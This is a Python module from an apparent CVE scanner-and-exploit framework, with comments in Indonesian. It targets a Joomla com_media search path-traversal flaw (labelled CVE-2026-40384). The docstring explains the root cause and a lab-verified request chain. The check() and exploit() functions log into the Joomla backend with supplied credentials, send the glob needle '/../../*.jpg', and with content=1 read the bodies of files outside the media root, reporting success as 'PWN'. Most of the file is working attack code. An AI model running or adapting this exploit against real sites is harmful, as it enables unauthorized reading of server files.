#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-40384 — path traversal / arbitrary file read in com_media search.

Affected : 4.0.0 - 5.4.6   (patch landed in 5.4.7)
Patched  : 5.4.7+

ROOT CAUSE — administrator/components/com_media/src/Controller/ApiController.php

    5.4.6 (VULNERABLE)
        $options['search'] = $this->input->getString('search', '');

    5.4.7 (PATCHED)
        $options['search'] = $this->input->getCmd('search', '');

getString() returns the raw, unfiltered value; getCmd() restricts the value to
A-Z, 0-9, underscore, period and hyphen (Joomla\\Filter\\InputFilter CMD) — no
slash, no asterisk. Everything downstream trusts the value.

ApiModel::getFiles() feeds it straight into the backend search:

    if ($options['search'] != null) {
        $files = $this->search($adapter, $options['search'], $path, $options['recursive']);
    }

and the local filesystem adapter builds a GLOB pattern out of it:

    $pattern = Path::clean($this->getLocalPath($path) . '/*' . $needle . '*');
    $results = $this->rglob($pattern);          // recursive glob on the pattern

Path::clean() only normalises slashes — it does NOT strip '..'. And because the
needle is placed after a '*', the leading wildcard expands to a real directory
name, so the '..' segments resolve and the glob walks OUT of the media root:

    needle  = /../../*.jpg
    pattern = <root>/images/*/../../*.jpg
    ->        <root>/images/sampledata/../../media/com_guidedtours/images/5_3/*.jpg

Confirmed on 5.4.5: the response contains files whose `path` is outside images/,
e.g. `local-images:/sampledata/../../media/com_guidedtours/images/5_3/automated-updates.jpg`
with `content=1` returning the full base64 file body.

CONSTRAINTS (learned in the lab)

  * Traversal needs the shape `/<dots>/*<ext>`: the '*' must consume a real
    directory component first, otherwise glob cannot cross '/' with '..'.
    `..`, `../`, `../../` alone and `/etc/passwd` all return zero results.
  * ApiModel::isMediaFile() keeps only files whose LAST dot-extension is in the
    allowed media list (images/audio/video/documents, from the `mediatypes`
    request parameter), so the file read is limited to media extensions. That
    still reaches anything image-like outside the media root.
  * Reaching the endpoint needs a backend session with core.manage OR
    core.create on com_media (Site\\Dispatcher\\Dispatcher::checkAccess()),
    i.e. Manager and up — it is NOT unauthenticated.
  * ApiController::getAdapter() takes the part before ':' of `path`, so a real
    request uses `path=local-images:/`.

CHAIN (lab-verified, Joomla 5.4.5)

    1. log in to /administrator as a user with com_media manage/create
    2. GET /administrator/index.php?option=com_media&task=api.files&format=json
           &path=local-images:/&search=/../../*.jpg[&content=1]
    3. 5.4.5  -> data[] lists files outside the media root
       5.4.7+ -> search becomes an empty/CMD-filtered string, stay inside root

requires:
    - backend session (Manager+ / com_media core.manage or core.create)
    - com_media enabled, `local-images` (filesystem local plugin) provider
"""
from __future__ import annotations

import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 6)
VULN_6_MAX = (6, 1, 1)

MEDIA_PATH = "/administrator/index.php?option=com_media&task=api.files&format=json"
# Needle yang terbukti menembus keluar dari root media pada 5.4.5.
TRAVERSAL_NEEDLE = "/../../*.jpg"
CONTROL_NEEDLE = "banner"


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] <= 4:
        return True
    if ver[0] == 5:
        return ver_le(ver, VULN_5_MAX)
    if ver[0] == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _is_logged_in(h, t):
    """Sesi backend hidup bila dashboard tidak lagi menampilkan form login."""
    r = h.get(f"{t.url}/administrator/index.php")
    if r is None or r.status_code != 200:
        return False
    body = r.text or ""
    # Form login punya input password bernama 'passwd'; dashboard tidak.
    return 'name="passwd"' not in body and "mod-login-username" not in body


def _login(h, t, opts):
    """Login backend secara idempoten; True bila sesi aktif."""
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    if not (u and p):
        return False
    if _is_logged_in(h, t):
        return True
    # Token CSRF dari form login, lalu POST.
    home = h.get(f"{t.url}/administrator/index.php")
    if home is None or home.status_code != 200:
        return False
    m = re.search(r'name="([a-f0-9]{32})" value="1"', home.text or "")
    if not m:
        return False
    token = m.group(1)
    data = {"username": u, "passwd": p, "option": "com_login", "task": "login",
            "return": "aW5kZXgucGhw", token: "1"}
    h.post(f"{t.url}/administrator/index.php", data=data)
    return True


def _media_files(h, t, needle, extra=""):
    import urllib.parse
    url = (f"{t.url}{MEDIA_PATH}&path=local-images%3A%2F"
           f"&search={urllib.parse.quote(needle)}{extra}")
    return h.get(url)


def _outside_root(files):
    """Cari file yang path-nya memuat '..' (keluar dari root media)."""
    for f in files:
        p = f.get("path", "") if isinstance(f, dict) else ""
        if ".." in p:
            return p
    return ""


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    if not (_opt(opts, "username") and _opt(opts, "password")):
        return ST_SKIP, "butuh kredensial backend (com_media core.manage/create)", \
                        f"version={ver_s}"

    if not _login(h, t, opts):
        return ST_UNKNOWN, "login backend gagal / form login tidak ditemukan", \
                           f"version={ver_s}"

    r = _media_files(h, t, TRAVERSAL_NEEDLE)
    if r is None:
        return ST_ERR, "tidak ada respons dari endpoint media", f"version={ver_s}"

    ev = f"GET search={TRAVERSAL_NEEDLE!r} HTTP {r.status_code}"
    if r.status_code == 403:
        return ST_SKIP, "sesi login tidak punya izin com_media (403)", \
                        f"version={ver_s} | {ev}"
    if r.status_code != 200:
        return ST_UNKNOWN, f"respons tak terduga HTTP {r.status_code}", \
                           f"version={ver_s} | {ev}"

    try:
        data = (r.json() or {}).get("data") or []
    except Exception:
        return ST_UNKNOWN, "respons bukan JSON", f"version={ver_s} | {ev}"

    leaked = _outside_root(data)
    if leaked:
        return (ST_VULN,
                f"Joomla {ver_s} rentan — traversal mengembalikan file di luar media root",
                f"version={ver_s} | {ev} | leaked_path={leaked}")

    return (ST_CLEAN,
            f"Joomla {ver_s} di rentang rentan; needle traversal tidak menembus root",
            f"version={ver_s} | {ev} n={len(data)}")


def exploit(t, h, opts):
    """
    Konfirmasi traversal + baca isi file di luar root (bukti, bukan sekadar listing).
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    if not (_opt(opts, "username") and _opt(opts, "password")):
        return ST_SKIP, "butuh kredensial backend (com_media core.manage/create)", \
                        f"version={ver_s}"

    if not _login(h, t, opts):
        return ST_UNKNOWN, "login backend gagal / form login tidak ditemukan", \
                           f"version={ver_s}"

    r = _media_files(h, t, TRAVERSAL_NEEDLE, extra="&content=1")
    if r is None or r.status_code != 200:
        return (ST_UNKNOWN if r is None else ST_CLEAN,
                f"tidak bisa membaca (HTTP {r.status_code if r else 'ERR'})",
                f"version={ver_s}")

    try:
        data = (r.json() or {}).get("data") or []
    except Exception:
        return ST_UNKNOWN, "respons bukan JSON", f"version={ver_s}"

    leaked = _outside_root(data)
    body_len = 0
    for f in data:
        if isinstance(f, dict) and ".." in (f.get("path") or ""):
            body_len = len(f.get("content") or "")
            break

    # Kontrol: needle tanpa traversal tidak boleh keluar root.
    rc = _media_files(h, t, CONTROL_NEEDLE)
    ctrl_ok = rc is not None and rc.status_code == 200
    ctrl_leak = ""
    if ctrl_ok:
        try:
            ctrl_leak = _outside_root((rc.json() or {}).get("data") or [])
        except Exception:
            ctrl_leak = ""

    if leaked and not ctrl_leak:
        return (ST_PWN,
                f"path traversal terkonfirmasi — file di luar media root terbaca "
                f"({body_len} byte konten)",
                f"version={ver_s} | leaked_path={leaked} content_len={body_len} | "
                f"control search={CONTROL_NEEDLE!r} HTTP {rc.status_code if rc else 'ERR'}")

    return (ST_CLEAN,
            f"Joomla {ver_s} — traversal tidak terbukti (leaked={leaked!r})",
            f"version={ver_s}")


register(CveModule(
    cve="CVE-2026-40384",
    cluster="joomla_core",
    title="Joomla Core - com_media search path traversal (arbitrary file read)",
    vclass="path traversal / arbitrary file read (glob injection)",
    cvss="6.5",
    severity="medium",
    cwe="CWE-22",
    product="Joomla! Core (com_media)",
    versions_affected="4.0.0-5.4.6, 6.0.0-6.1.1",
    status="verified",
    requires=[
        "sesi backend dengan core.manage atau core.create pada com_media (Manager+)",
        "com_media + provider local-images aktif",
    ],
    check=check,
    exploit=exploit,
    notes=("ApiController 5.4.6 memakai getString('search') (mentah); 5.4.7 menggantinya "
           "dengan getCmd yang hanya menerima A-Z 0-9 _ . - (tanpa '/' dan '*'). Nilai itu "
           "masuk glob: Path::clean(root.'/*'.$needle.'*') — Path::clean TIDAK membuang '..'. "
           "Needle '/../../*.jpg' mengembang lewat '*'(nama direktori) lalu '..' keluar root. "
           "Dibatasi isMediaFile() (ekstensi media) dan butuh login backend."),
))
